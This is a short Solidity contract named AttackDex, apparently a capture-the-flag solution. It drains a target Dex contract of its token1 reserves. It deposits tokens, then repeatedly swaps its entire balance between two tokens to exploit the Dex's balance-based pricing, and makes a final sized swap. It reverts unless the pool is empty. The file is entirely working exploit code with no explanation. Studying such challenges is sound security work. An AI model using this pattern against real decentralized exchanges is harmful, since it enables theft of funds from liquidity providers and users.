// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Dex, IERC20} from "./Dex.sol";

contract AttackDex {
    Dex public target;
    IERC20 public token1;
    IERC20 public token2;

    constructor(address _target) {
        target = Dex(_target);
        token1 = IERC20(target.token1());
        token2 = IERC20(target.token2());
    }

    function attack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        target.approve(address(target), type(uint256).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);

        target.swap(address(token2), address(token1), 45);
        if (token1.balanceOf(address(target)) != 0) revert("Dex not drained yet");
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) internal {
        target.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}
